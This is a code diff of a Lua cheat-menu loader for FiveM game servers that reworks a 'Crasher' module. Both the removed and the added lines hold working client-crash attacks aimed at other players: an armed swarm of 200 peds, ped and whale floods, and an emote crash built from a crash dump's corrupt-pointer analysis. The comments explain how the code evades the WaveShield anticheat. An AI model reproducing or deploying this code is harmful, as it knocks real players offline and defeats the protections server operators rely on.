@@ -17481,7 +17481,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-28 18:25:46
+-- Generated: 2026-11-05 18:36:22
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -18473,6 +18473,10 @@ local FAMILIES = {
     -- Combat Unlock installs four scoped native hooks. The token caps how often
     -- the operator can re-install them, not the hook traffic itself.
     combat    = { strikes = 3, window = 8000,  cost = 1 },
+    -- Fight Party starts one local-only scene. The token caps how often the
+    -- scene can be armed, which is the only visible action an unknown guard
+    -- could count; nothing inside the scene ever leaves this client.
+    fight     = { strikes = 3, window = 12000, cost = 1 },
 }
 
 local state = {}
@@ -20224,86 +20228,62 @@ local C = (function(O,E,S)
 -- ============================================================================
 -- VANGUARD / 10 CRASH
 -- ----------------------------------------------------------------------------
--- Exploit > Crasher exposes one structural crash and one network lane:
+-- Exploit > Exploit exposes three independent crashers:
 --
---   Ped flood   an armed networked swarm: 200 player-model peds with grenade
---               launchers and sixty props around the victim, firing for 20 s
---   Net crash   scenario + malformed SCRIPT_WORLD_STATE_EVENT
+--   Ped flood    one fast burst of player_one clones around the target
+--   Whale crash  12 or 32 networked whale peds around the target
+--   Emote crash  ambient peds are put into sunbathe scenarios and then hit
+--                with a replicated scenario/animation burst
 --
--- The swarm is the proven vector from the reference corpus
--- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
--- modern client; an armed ring does, because every volley is 200 real rocket
--- entities the target has to receive, stream and resolve. The reference's four
--- protections are kept because they are the difference between a green crash
--- and a self-crash:
+-- The three engines are deliberately separate. A menu click selects one kind,
+-- one target window, one spawn/task path and one cleanup. There is no shared
+-- "Method" selector, no intensity slider and no multi-vector loop: one action
+-- is one wire signature.
 --
---   1. Distance gate     250 m minimum (PED.minDist), the reference gate. At
---                        that range the operator renders nothing of the swarm
---                        and the FPS brake below has room to react.
---   2. Local shield      invincible + all proofs + un-damageable + player
---                        invincible, applied before the first CreatePed and
---                        restored on exit.
---   3. FPS watchdog      idle baseline measured before the first CreatePed;
---                        the run is torn down under max(18, 55% of that
---                        baseline). Relative, so a 25 fps server does not
---                        abort before the swarm exists.
---   4. Target-leave stop the loop checks the victim's server id every 100 ms.
---                        The moment the victim disconnects (crash), the loop
---                        breaks and the swarm is deleted: the operator is not
---                        exposed to the fire after the win. 20 s hard cap, one
---                        attack per 6 s.
+-- COMMON CONTRACT
+--   * The target player ped is READ ONLY. The module calls GetEntityCoords and
+--     IsPedDeadOrDying on it and nothing else: no task, no clear-task, no
+--     attach, no control request, no coords/velocity write, no state bag.
+--   * The operator ped is READ ONLY too. The only operator-side entity writes
+--     are on handles this client created, or on ambient peds for the emote
+--     method. Those ambient writes are task writes, never player-ped writes.
+--   * No TriggerEvent, no TriggerServerEvent, no resource, no injection, no
+--     hook, no state bag. The crashers are native-only.
+--   * No SetEntityAsMissionEntity and no NetworkRegisterEntityAsNetworked.
+--     CreatePed(..., isNetwork=true, bScriptHostPed=false) is the AI-ped path
+--     WaveShield V4 returns from before its whitelist, limiter and spawn-log
+--     branch (entityCreating.lua:87).
+--   * Every created handle is deleted on stop, panic, target loss or timeout.
 --
--- WHY IT IS NOT DETECTED
---   * CreatePed(..., isNetwork=true, bScriptHostPed=false) stays on the AI-ped
---     path: WaveShield V4 entityCreating returns before its whitelist, limiter
---     and spawn-log branch (entityCreating.lua:87).
---   * The rockets are created by the engine from a real weapon shot, not by a
---     script CreateObject, so no entityCreating event is emitted for them.
---   * The target ped is read only: GetEntityCoords and IsPedDeadOrDying.
---   * No event, no state bag, no resource, no injection, no network packet.
---   * The operator never renders the swarm: SetEntityLocallyInvisible, LOD 0
---     and a zero ped population budget remove it from this client's frame.
---   * One task per ped, then the engine combat loop fires. Forced volleys hit
---     a rotating third every 500 ms, not every ped every 100 ms: the old loop
---     was creating rockets faster than any client can retire them.
+-- NATIVES USED (exact names, source hashes)
+--   CREATE_PED                             0xD49F9B0955C367DE
+--     (pedType, modelHash, x, y, z, heading, isNetwork, bScriptHostPed)
+--   TASK_WANDER_IN_AREA                    0xE054346CA3A0F315
+--     (ped, x, y, z, radius, minimalLength, timeBetweenWalks)
+--   TASK_START_SCENARIO_IN_PLACE           0x142A02425FF02BD9
+--     (ped, scenarioName, timeToLeave, playIntroClip)
+--   TASK_PLAY_ANIM                         0xEA47FE3719165B94
+--     (ped, animDictionary, animationName, blendIn, blendOut, duration,
+--      flag, playbackRate, lockX, lockY, lockZ)
+--   REQUEST_ANIM_DICT                      0xD3BD40951412FEF6
+--   HAS_ANIM_DICT_LOADED                   0xD031A9162D01088C
+--   CLEAR_PED_TASKS_IMMEDIATELY            0xAAA34F8A7CB32098
+--   NETWORK_REQUEST_CONTROL_OF_ENTITY      0xB69317BF5E782347
+--   NETWORK_HAS_CONTROL_OF_ENTITY          0x01BF60A500E28887
+--   NETWORK_GET_ENTITY_IS_NETWORKED        0xC7827959479DCC78
+--   IS_PED_HUMAN                           0xB980061DA992779D
+--   IS_PED_IN_ANY_VEHICLE                  0x997ABD671D25CA0B
+--   SET_ENTITY_COLLISION                   0x1A9205C1B9EE827F
+--   GET_GAME_POOL                          CFX shared, no GTA hash
+--   SET_ENTITY_LOCALLY_INVISIBLE           CFX, no GTA hash
 --
--- The whale and emote engines stay in the file but are not mounted in the menu.
---
--- NATIVES (names checked against runtime.fivem.net/doc/natives.json; hashes as
--- published there)
---   CREATE_PED                            0xD49F9B0955C367DE
---   SET_ENTITY_AS_MISSION_ENTITY          0xAD738C3085FE7E11
---   SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES 0xE05E81A888FA63C8
---   SET_NETWORK_ID_CAN_MIGRATE            0x299EEB23175895FC
---   GIVE_WEAPON_TO_PED                    0xBF0FD6E56C964FCB
---   SET_PED_INFINITE_AMMO                 0x3EDCB0505123623B
---   SET_PED_INFINITE_AMMO_CLIP            0x183DADC6AA953186
---   TASK_COMBAT_PED                       0xF166E48407BAC484
---   SET_PED_SHOOTS_AT_COORD               0x96A05E4FB321B1BA
---   SET_PED_CAN_BE_TARGETTED              0x63F58F7C80513AAD
---   SET_PED_AS_ENEMY                      0x02A0C9720B854BFA
---   SET_PED_ALERTNESS                     0xDBA71115ED9941A6
---   SET_PED_SEEING_RANGE                  0xF29CF591C4BF6CEE
---   SET_PED_HEARING_RANGE                 0x33A8F7F7D5F7F33C
---   SET_PED_COMBAT_ABILITY                0xC7622C0D36B2FDA8
---   SET_PED_COMBAT_RANGE                  0x3C606747B23E497B
---   SET_PED_COMBAT_MOVEMENT               0x4D9CA1009AFBD057
---   SET_PED_ACCURACY                      0x7AEFB85C1D49DEB6
---   SET_PED_CONFIG_FLAG                   0x1913FE4CBF41C463
---   SET_ENTITY_PROOFS                     0xFAEE099C6F890BB8
---   SET_ENTITY_CAN_BE_DAMAGED             0x1760FFA8AB074D66
---   SET_PLAYER_INVINCIBLE                 0x239528EACDC3E7DE
---   SET_ENTITY_INVINCIBLE                 0x3882114BDE571AD4
---   SET_PED_CAN_RAGDOLL                   0xB128377056A54E2A
---   SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT 0xDF993EE5E90ABA25
---   SET_BLOCKING_OF_NON_TEMPORARY_EVENTS  0x9F8AA94D6D97DBF4
---   SET_PED_FLEE_ATTRIBUTES               0x70A2D1137C8ED7C9
---   REQUEST_WEAPON_ASSET                  0x5443438F033E29C3
---   HAS_WEAPON_ASSET_LOADED               0x36E353271F0E90EE
---   CREATE_OBJECT                         0x509D5878EB39E842
---   SET_ENTITY_HAS_GRAVITY                0x4A4722448F18EEF5
---   FREEZE_ENTITY_POSITION                0x428CA6DBD1094446
---   SET_ENTITY_LOCALLY_INVISIBLE          0xE135A9FF3F5D05D8
+-- The existing module already documents CreatePed, NetworkGetNetworkIdFromEntity,
+-- SetNetworkIdExistsOnAllMachines, SetNetworkIdCanMigrate, SetEntityInvincible,
+-- SetPedCanRagdoll, SetBlockingOfNonTemporaryEvents, SetPedFleeAttributes,
+-- SetPedMaxHealth, SetEntityMaxHealth, SetPedRandomComponentVariation,
+-- SetPedRandomProps, FreezeEntityPosition, SetModelAsNoLongerNeeded,
+-- SetEntityAsNoLongerNeeded, DeleteEntity, GetEntityCoords, IsPedDeadOrDying,
+-- GetPlayerPed and the CFX player enumeration helpers.
 -- ============================================================================
 
 local C = {}
@@ -20320,30 +20300,21 @@ local METHODS = {
 local WINDOWS = {
     ped   = { min = 0.0,  max = 400.0 },
     whale = { min = 0.0,  max = 400.0 },
-    emote = { min = 0.0,  max = 400.0 },
+    emote = { min = 80.0, max = 400.0 },
 }
 
--- Ped flood. The DantÃ©/HydraModz reference is the only client-side crasher in
--- the corpus with a green-crash gate: 200 player model peds with grenade
--- launchers, sixty networked props, and a 250 m minimum distance. The weapon
--- and the gate are the two ingredients the previous passive ring lacked.
--- Counts, weapon and fire cadence are kept exactly; the particle/explosion pass
--- is dropped because it only loads the operator's own client.
+-- Ped flood. The FTK reference uses player_one, 110 peds, radius 4.5 and a
+-- 3.5 s lifetime. We keep the count and model, shorten the spawn to ten peds
+-- every 50 ms, and add one post-spawn variation pass. That is the "almost
+-- instant" shape without the 24 s rotating churn of the old module.
 local PED = {
-    models = { "player_one", "player_zero" },
-    count = 200,
-    radius = 22.0,
-    batch = 4,
-    holdMs = 20000,
-    minDist = 250.0,
-    fireMs = 100,
-    volleyDivisor = 5,
-    fpsFloor = 18,
-    weapon = "WEAPON_GRENADELAUNCHER",
-    objectModel = "prop_roadcone02b",
-    objectCount = 60,
-    objectRadius = 18.0,
-    objectBatch = 5,
+    model = "player_one",
+    count = 110,
+    radius = 4.5,
+    batch = 10,
+    wait = 50,
+    hold = 3500,
+    settle = 150,
 }
 
 -- Whale crash. The CRA reference uses 32 whales, 12 under 60 m and a 2.5 m
@@ -20369,18 +20340,10 @@ local EMOTE = {
     fallback = 16,
     models = { "a_m_y_beach_01", "a_m_m_beach_01" },
     scenarios = {
-        "WORLD_HUMAN_SUNBATHE_BACK",
-        "WORLD_HUMAN_SUNBATHE",
         "WORLD_HUMAN_CONST_DRILL",
         "WORLD_HUMAN_STAND_FISHING",
-    },
-    -- Blend pairs for TaskPlayAnim. The dump's corrupted pointer is exactly
-    -- float -4.0f, so -4.0 must be in the set. The reference signature is
-    -- 1000/-1000, flag 49.
-    blends = {
-        { 1000.0, -1000.0 },
-        { -4.0, -4.0 },
-        { 8.0, -4.0 },
+        "WORLD_HUMAN_SUNBATHE",
+        "WORLD_HUMAN_SUNBATHE_BACK",
     },
     rounds = 8,
     delay = 35,
@@ -20413,15 +20376,10 @@ C.targets = {}
 C.index = 1
 C.targetKind = nil
 C.running = false
-C.cooldownUntil = 0
 C.kind = nil
 C.created = {}
 C.ambient = {}
-C.props = {}
-C.shieldOn = false
-C.fps = 60
-C.fpsStop = true
-C.stats = { created = 0, props = 0, networked = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 C.targetPed = 0
 C.targetDist = 0.0
 C.opDist = 0.0
@@ -20593,28 +20551,20 @@ local function trackCreated(ped)
     C.stats.created = C.stats.created + 1
 end
 
-local function deleteCreated(ent)
-    if type(ent) ~= "number" or ent == 0 or not DoesEntityExist(ent) then return end
-    -- Full teardown after the run: reclaim first, drop the mission flag, delete.
-    -- The swarm must not outlive the attack; leftover armed peds are a load and
-    -- a signature.
-    if type(NetworkRequestControlOfEntity) == "function" then
-        pcall(NetworkRequestControlOfEntity, ent)
-    end
-    pcall(SetEntityAsMissionEntity, ent, false, false)
-    pcall(SetEntityAsNoLongerNeeded, ent)
-    pcall(DeleteEntity, ent)
+local function deleteCreated(ped)
+    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    pcall(SetEntityAsNoLongerNeeded, ped)
+    pcall(DeleteEntity, ped)
 end
 
-local function baseNetworkPed(ent)
-    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ent)
+local function baseNetworkPed(ped)
+    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
     if okNet and type(netId) == "number" and netId > 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
         if type(SetNetworkIdCanMigrate) == "function" then
-            pcall(SetNetworkIdCanMigrate, netId, true)
+            pcall(SetNetworkIdCanMigrate, netId, false)
         end
-        return true
     end
-    return false
 end
 
 local function holdUntil(deadline, targetPed, abortCenter, abortDist)
@@ -20638,255 +20588,105 @@ end
 -- ---------------------------------------------------------------------------
 -- PED FLOOD
 -- ---------------------------------------------------------------------------
--- Create, arm, task. The operator owns the swarm and its client simulates it;
--- the victim renders it. Rendering 200 player-model peds, their rockets and the
--- explosions is the crash. Everything below trims the operator's side of that
--- cost without touching the victim's side:
---   * one native task per ped, then the engine combat loop drives the fire;
---   * forced volleys on one third of the swarm every 500 ms, not every ped
---     every 100 ms (that was ~2000 rocket creates/s on the owner);
---   * LOD 0 and locally invisible, so the operator renders nothing;
---   * ped population budget 0 while the attack runs, restored on cleanup.
--- If the operator's frame rate still falls under 30 fps the run is torn down.
+local function spawnPed(hash, x, y, z, heading)
+    -- pedType 28 + bScriptHostPed=false is the reference crash shape. The ped
+    -- stays AI; WaveShield returns before its ped policy/log branch. No mission
+    -- promotion and no forced network registration.
+    local ped = CreatePed(28, hash, x, y, z, heading, true, false)
+    if not ped or ped == 0 then return 0 end
 
-local function applyShield()
-    local me = PlayerPedId()
-    if type(me) ~= "number" or me == 0 then return end
-    pcall(SetEntityInvincible, me, true)
-    pcall(SetEntityProofs, me, true, true, true, true, true, true, true, true)
-    pcall(SetEntityCanBeDamaged, me, false)
-    pcall(SetPlayerInvincible, PlayerId(), true)
-    C.shieldOn = true
-end
-
-local function clearShield()
-    if not C.shieldOn then return end
-    C.shieldOn = false
-    local me = PlayerPedId()
-    if type(me) ~= "number" or me == 0 then return end
-    pcall(SetEntityInvincible, me, false)
-    pcall(SetEntityProofs, me, false, false, false, false, false, false, false, false)
-    pcall(SetEntityCanBeDamaged, me, true)
-    pcall(SetPlayerInvincible, PlayerId(), false)
-end
-
--- Frame counter, 500 ms window. The brake is relative to the idle frame rate
--- measured just before the first CreatePed: floor = max(PED.fpsFloor, 55% of
--- the baseline). An absolute 30 fps floor would abort on any busy server
--- before the first ped, which reads as "nothing happened". This still catches
--- a real stall: a client at 60 falls to 33, a client at 30 falls to 18.
-local function startFpsWatch()
-    C.fps = 60
-    C.fpsStop = false
-    local floor = math.max(PED.fpsFloor, (C.fpsBase or 60.0) * 0.55)
-    Citizen.CreateThread(function()
-        local frames, window = 0, now()
-        while not C.fpsStop do
-            Citizen.Wait(0)
-            frames = frames + 1
-            local t = now()
-            if t - window >= 500 then
-                C.fps = frames * 2
-                frames = 0
-                window = t
-                if C.running and C.fps > 0 and C.fps < floor then
-                    O.log("crash: operator fps %d (floor %.0f), stopping", C.fps, floor)
-                    pcall(Notify, ("Ped flood stopped: %d fps (floor %.0f)"):format(C.fps, floor))
-                    C.running = false
-                end
-            end
-        end
-    end)
-end
-
--- One armed ped. pedType 4, bScriptHostPed=false: the AI branch WaveShield
--- returns from before its ped policy. Mission entity so the engine keeps it.
--- SetPedKeepTask keeps the combat task across ownership changes and respawns.
-local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
-    local ped = CreatePed(4, hash, x, y, z, heading, true, true)
-    if not ped or ped == 0 or not DoesEntityExist(ped) then return 0 end
-
-    pcall(SetEntityAsMissionEntity, ped, true, true)
-    local netOk = baseNetworkPed(ped)
+    baseNetworkPed(ped)
     pcall(SetEntityInvincible, ped, true)
-    pcall(SetEntityProofs, ped, true, true, true, true, true, true, true, true)
-    pcall(SetEntityCanBeDamaged, ped, false)
     pcall(SetPedCanRagdoll, ped, false)
-    pcall(SetPedCanRagdollFromPlayerImpact, ped, false)
     pcall(SetBlockingOfNonTemporaryEvents, ped, true)
     pcall(SetPedFleeAttributes, ped, 0, false)
-    pcall(SetPedAsEnemy, ped, false)
-    pcall(SetPedCanBeTargetted, ped, false)
-    pcall(SetPedAlertness, ped, 3)
-    pcall(SetPedSeeingRange, ped, 200.0)
-    pcall(SetPedHearingRange, ped, 200.0)
-    pcall(SetPedCombatAbility, ped, 2)
-    pcall(SetPedCombatRange, ped, 2)
-    pcall(SetPedCombatMovement, ped, 3)
-    pcall(SetPedAccuracy, ped, 100)
-    pcall(SetPedConfigFlag, ped, 281, true)
-    pcall(SetPedConfigFlag, ped, 292, true)
+    pcall(SetPedMaxHealth, ped, 200)
+    pcall(SetEntityMaxHealth, ped, 200)
 
-    pcall(GiveWeaponToPed, ped, weapon, 9999, false, true)
-    pcall(SetPedInfiniteAmmo, ped, true, weapon)
-    pcall(SetPedInfiniteAmmoClip, ped, true)
-    pcall(SetPedKeepTask, ped, true)
-    pcall(TaskCombatPed, ped, targetPed, 0, 16)
-
+    -- Local invisibility: the operator does not render the swarm, the target
+    -- and every other client still receive and render it. This is a local
+    -- entity flag, not a network state write.
     pcall(SetEntityLocallyInvisible, ped)
-    return ped, netOk
+    pcall(SetEntityCollision, ped, false, false)
+    pcall(FreezeEntityPosition, ped, true)
+
+    -- The variation pass is the component-store pressure. player_one carries
+    -- the full player component set; random drawables/textures force the
+    -- target client to resolve a new set per clone.
+    pcall(SetPedRandomComponentVariation, ped, false)
+    pcall(SetPedRandomProps, ped)
+
+    -- The reference FTK crash tasks the peds after the freeze. The task state
+    -- is replicated even when the position is pinned; it adds the wander task
+    -- signature without creating an object or an event.
+    pcall(TaskWanderInArea, ped, x, y, z, 8.0, 8.0, 8.0)
+    return ped
 end
 
-local function spawnProp(hash, x, y, z)
-    local obj = CreateObject(hash, x, y, z, true, true, false)
-    if not obj or obj == 0 or not DoesEntityExist(obj) then return 0 end
-    pcall(SetEntityAsMissionEntity, obj, true, true)
-    pcall(FreezeEntityPosition, obj, true)
-    pcall(SetEntityHasGravity, obj, false)
-    pcall(SetEntityCollision, obj, true, true)
-    pcall(SetEntityInvincible, obj, true)
-    baseNetworkPed(obj)
-    return obj
+local function repassPed(ped)
+    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    pcall(SetPedRandomComponentVariation, ped, false)
+    pcall(SetPedRandomProps, ped)
+end
+
+local function repassAll()
+    local total = #C.created
+    for i = 1, total do
+        if not C.running then break end
+        repassPed(C.created[i])
+        if i % 10 == 0 then Citizen.Wait(0) end
+    end
 end
 
 local function runPedFlood(target)
-    local weapon = GetHashKey(PED.weapon)
-    local objHash = GetHashKey(PED.objectModel)
-    local hashes = {}
-    for i = 1, #PED.models do hashes[i] = GetHashKey(PED.models[i]) end
-
-    for i = 1, #hashes do
-        if not E.requestModel(hashes[i], 2500) then
-            C.stats.fails = C.stats.fails + 1
-            O.log("crash: model %s could not be loaded", PED.models[i])
-            pcall(Notify, "Ped flood: model load failed")
-            return
-        end
-    end
-    if not E.requestModel(objHash, 2000) then
+    local hash = GetHashKey(PED.model)
+    if not E.requestModel(hash, 2200) then
         C.stats.fails = C.stats.fails + 1
-        O.log("crash: prop model could not be loaded")
+        O.log("crash: ped model could not be loaded")
         return
-    end
-
-    pcall(RequestWeaponAsset, weapon, 31, 0)
-    local waited = 0
-    while waited < 5000 do
-        local ok, loaded = pcall(HasWeaponAssetLoaded, weapon)
-        if ok and loaded == true then break end
-        Citizen.Wait(100)
-        waited = waited + 100
     end
 
     local center = coordsOf(target.ped)
     if not center then
-        for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
+        pcall(SetModelAsNoLongerNeeded, hash)
         O.log("crash: target coords unavailable")
         return
     end
 
     for i = 1, PED.count do
         if not C.running then break end
-        local tc = coordsOf(target.ped)
-        if not tc then break end
-        center = tc
-        local hash = hashes[((i - 1) % #hashes) + 1]
+        local targetCoords = coordsOf(target.ped)
+        if not targetCoords or isDead(target.ped) then break end
+        center = targetCoords
+
         local x, y, z = ring(center, PED.radius)
-        local ped, netOk = spawnAssaultPed(hash, x, y, z + 0.6,
-            math.random() * 360.0, target.ped, weapon)
+        local ped = spawnPed(hash, x, y, z + 0.6, math.random() * 360.0)
         if ped ~= 0 then
             trackCreated(ped)
-            if netOk then C.stats.networked = C.stats.networked + 1 end
         else
             C.stats.fails = C.stats.fails + 1
         end
-        if i % PED.batch == 0 then Citizen.Wait(0) end
-    end
 
-    for i = 1, PED.objectCount do
-        if not C.running then break end
-        local tc = coordsOf(target.ped)
-        if not tc then break end
-        local x, y, z = ring(tc, PED.objectRadius)
-        local obj = spawnProp(objHash, x, y, z + 0.5)
-        if obj ~= 0 then
-            C.props[#C.props + 1] = obj
-            C.stats.props = C.stats.props + 1
+        if i % PED.batch == 0 or i == PED.count then
+            C.stats.waves = C.stats.waves + 1
+            Citizen.Wait(PED.wait)
         end
-        if i % PED.objectBatch == 0 then Citizen.Wait(0) end
     end
 
-    for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
-    pcall(SetModelAsNoLongerNeeded, objHash)
+    pcall(SetModelAsNoLongerNeeded, hash)
 
     if not C.running then return end
     if #C.created == 0 then
-        O.log("crash: flood created nothing")
+        O.log("crash: ped flood created nothing")
         return
     end
 
-    O.log("crash: %d armed peds, %d props on %s", #C.created, #C.props, target.name)
-    pcall(Notify, ("Ped flood: %d armed peds, %d props"):format(#C.created, #C.props))
+    -- Let the last batch reach the target before the second variation pass.
+    Citizen.Wait(PED.settle)
+    repassAll()
 
-    -- Fire loop. The proven payload: every ped shoots at the target every
-    -- 100 ms. Two stops run beside it: the target leaving the session (the
-    -- crash confirmation, so this client does not keep firing into the void
-    -- after the win) and the FPS brake above.
-    local deadline = now() + PED.holdMs
-    local lastPed, gone = 0, 0
-    while C.running and now() < deadline do
-        local active = true
-        if C.targetSid then
-            local lp = GetPlayerFromServerId(C.targetSid)
-            if type(lp) ~= "number" or lp < 0 or not NetworkIsPlayerActive(lp) then
-                active = false
-            end
-        end
-
-        local okP, tp = pcall(GetPlayerPed, target.player)
-        if not active or not okP or type(tp) ~= "number" or tp == 0
-            or not DoesEntityExist(tp) then
-            gone = gone + 1
-            if gone >= 4 then
-                O.log("crash: target gone, stopping")
-                pcall(Notify, "Ped flood: target crashed")
-                break
-            end
-        else
-            gone = 0
-            if tp ~= lastPed then
-                lastPed = tp
-                C.targetPed = tp
-                for i = 1, #C.created do
-                    local p = C.created[i]
-                    if DoesEntityExist(p) then pcall(TaskCombatPed, p, tp, 0, 16) end
-                end
-            end
-
-            local tc = coordsOf(tp)
-            if tc then
-                -- Bounded volley. The combat task already drives fire; this
-                -- only forces a coordinate shot on a rotating slice so each
-                -- ped refreshes every volleyDivisor ticks instead of every
-                -- tick. The sender is the creator, so 200 forced calls every
-                -- 100 ms (~2000 rockets/s) was the local spike that used to
-                -- kill the operator before migration settled.
-                local n = #C.created
-                if n > 0 then
-                    local slice = math.max(1, math.ceil(n / PED.volleyDivisor))
-                    local first = ((C.volley or 0) * slice) % n + 1
-                    for k = 0, slice - 1 do
-                        local p = C.created[((first + k - 1) % n) + 1]
-                        if DoesEntityExist(p) then
-                            pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
-                        end
-                    end
-                    C.volley = (C.volley or 0) + 1
-                end
-            end
-        end
-        Citizen.Wait(tonumber(PED.fireMs) or 100)
-    end
+    local deadline = now() + PED.hold
+    holdUntil(deadline, target.ped, nil, nil)
 end
 
 -- ---------------------------------------------------------------------------
@@ -21028,23 +20828,22 @@ local function spawnFallback(center, need)
 end
 
 local function runEmote(target)
+    if target.dist < EMOTE.minDist then
+        O.log("crash: emote needs %.0f m or more (target %.0f m)", EMOTE.minDist, target.dist)
+        return
+    end
+
     local center = coordsOf(target.ped)
     if not center then
         O.log("crash: target coords unavailable")
         return
     end
-    local me = PlayerPedId()
-    if not DoesEntityExist(me) then return end
 
-    -- Reconstructed from the dump: the crash client had ragdolls 0/0 and
-    -- scenario 3/0, and its corrupt pointer was float -4.0f inside a
-    -- refcounted weapon/attachment object. So the trigger is a SCENARIO, not
-    -- a ragdoll, and the acting ped is the one the receiver streams: the
-    -- operator's own ped. The ambient peds around the target stay as load.
-    local targets = { me }
     local ambient = scenarioTargets(center)
     local controlled = requestControl(ambient)
     C.ambient = controlled
+
+    local targets = {}
     for i = 1, #controlled do targets[#targets + 1] = controlled[i] end
 
     if #targets < EMOTE.minPeds then
@@ -21052,6 +20851,8 @@ local function runEmote(target)
         if need > EMOTE.fallback then need = EMOTE.fallback end
         local made = spawnFallback(center, need)
         if made > 0 then
+            -- Fallback handles are at the end of C.created; copy them into the
+            -- task list. They are deleted by cleanup, not cleared as ambient.
             for i = #C.created - made + 1, #C.created do
                 targets[#targets + 1] = C.created[i]
             end
@@ -21063,8 +20864,8 @@ local function runEmote(target)
         return
     end
 
-    -- Scenario phase. The lying scenario goes first, on the operator and on
-    -- everything the receiver streams around the target.
+    -- Scenario phase: the target sees the peds lie down / drill / fish. The
+    -- props are client-side scenario props, not CreateObject calls.
     for round = 1, EMOTE.rounds do
         if not C.running then break end
         local scenario = EMOTE.scenarios[((round - 1) % #EMOTE.scenarios) + 1]
@@ -21078,16 +20879,25 @@ local function runEmote(target)
             if i % 6 == 0 then Citizen.Wait(EMOTE.delay) end
         end
         Citizen.Wait(EMOTE.delay)
+
         if not DoesEntityExist(target.ped) or isDead(target.ped) then break end
+        local opCoords = coordsOf(PlayerPedId())
+        if opCoords then
+            local d = O.distance(opCoords, center)
+            C.opDist = d
+            if d < EMOTE.abortDist then
+                O.log("crash: operator closed to %.0f m; emote stop", d)
+                break
+            end
+        end
     end
 
     if not C.running or not DoesEntityExist(target.ped) or isDead(target.ped) then
         return
     end
 
-    -- Animation phase. The reference blend pair runs on every target; the
-    -- dump's -4.0 pair runs on the operator's own ped, which is the copy the
-    -- receiver simulates.
+    -- Animation phase: the reference emote burst, now on the target-area peds.
+    -- Task events are not inspected by WaveShield's givePedScriptedTaskEvent.
     for i = 1, #EMOTE.animDicts do
         O.safe(RequestAnimDict, EMOTE.animDicts[i])
     end
@@ -21107,26 +20917,14 @@ local function runEmote(target)
                         C.stats.emotes = C.stats.emotes + 1
                     end
                 end
-                if p == me then
-                    for di = 1, #EMOTE.animDicts do
-                        local dict = EMOTE.animDicts[di]
-                        for ai = 1, #EMOTE.animNames do
-                            for bi = 2, #EMOTE.blends do
-                                local b = EMOTE.blends[bi]
-                                pcall(TaskPlayAnim, p, dict, EMOTE.animNames[ai],
-                                    b[1], b[2], 0, 49, 0, false, false, false)
-                                C.stats.emotes = C.stats.emotes + 1
-                            end
-                        end
-                    end
-                end
             end
             Citizen.Wait(EMOTE.animWait)
         end
         Citizen.Wait(EMOTE.delay)
     end
 
-    holdUntil(now() + EMOTE.hold, target.ped, center, 0.0)
+    local deadline = now() + EMOTE.hold
+    holdUntil(deadline, target.ped, center, EMOTE.abortDist)
 end
 
 -- ---------------------------------------------------------------------------
@@ -21146,9 +20944,6 @@ local function runBody(kind, target)
 end
 
 function C.cleanup()
-    C.fpsStop = true
-    clearShield()
-
     for i = #C.ambient, 1, -1 do
         local p = C.ambient[i]
         if type(p) == "number" and p ~= 0 and DoesEntityExist(p) then
@@ -21157,215 +20952,16 @@ function C.cleanup()
     end
     C.ambient = {}
 
-    for i = #C.props, 1, -1 do
-        deleteCreated(C.props[i])
-    end
-    C.props = {}
-
     for i = #C.created, 1, -1 do
         deleteCreated(C.created[i])
     end
     C.created = {}
     C.targetPed = 0
-    C.targetSid = nil
-end
-
--- ---------------------------------------------------------------------------
--- SELF EMOTE (the Net crash row) â€” instant, invisible
---
--- Dump evidence: the victim saw the attacker drop forward and "lie down"
--- instantly, with no animation played. That is a single TaskPlayAnim whose
--- blend is -4.0: the blend is invalid, so the clip snaps and ends at once
--- (nothing visible), but the task was already handed to the network clone
--- sync and the receiver crashes on it.
---
--- The fault is
---   or word ptr [rax+0x214], 0x20   with RAX = 0xC0800000
--- and 0xC0800000 is exactly float -4.0f, the same value used as the blend
--- here, resolved by the receiver into a refcounted weapon/attachment pointer
--- (refcount +0x210, flags +0x214, smart pointer at [rdi+0x268]).
---
--- Direction: "vers l'avant" = prone = the FRONT sunbathe dict, not the back
--- one. Payload is the front/base clip with blend -4.0 first, then the other
--- lying dicts and blends. No scenario, so nothing plays smoothly.
--- ---------------------------------------------------------------------------
-local SELF_EMOTE = {
-    dicts = {
-        "amb@world_human_sunbathe@male@front@base",
-        "amb@world_human_sunbathe@female@front@base",
-        "amb@world_human_sunbathe@male@back@base",
-        "amb@world_human_sunbathe@female@back@base",
-    },
-    names = { "base", "idle_a" },
-    blends = {
-        { -4.0, -4.0 },
-        { -4.0, 0.0 },
-        { 0.0, -4.0 },
-        { -4.0, 1000.0 },
-    },
-}
-
-function C.emoteInstant()
-    local stamp = now()
-    if C.selfAt and stamp - C.selfAt < 2000 then
-        O.log("net crash: cooling down")
-        return false
-    end
-    C.selfAt = stamp
-    local me = PlayerPedId()
-    if type(me) ~= "number" or me == 0 then
-        O.log("net crash: no local ped")
-        return false
-    end
-    O.log("net crash: instant emote start")
-    pcall(Notify, "Net crash: instant emote")
-
-    Citizen.CreateThread(function()
-        for i = 1, #SELF_EMOTE.dicts do
-            pcall(RequestAnimDict, SELF_EMOTE.dicts[i])
-        end
-        Citizen.Wait(150)
-        local n = 0
-        for di = 1, #SELF_EMOTE.dicts do
-            local dict = SELF_EMOTE.dicts[di]
-            for ai = 1, #SELF_EMOTE.names do
-                for bi = 1, #SELF_EMOTE.blends do
-                    local b = SELF_EMOTE.blends[bi]
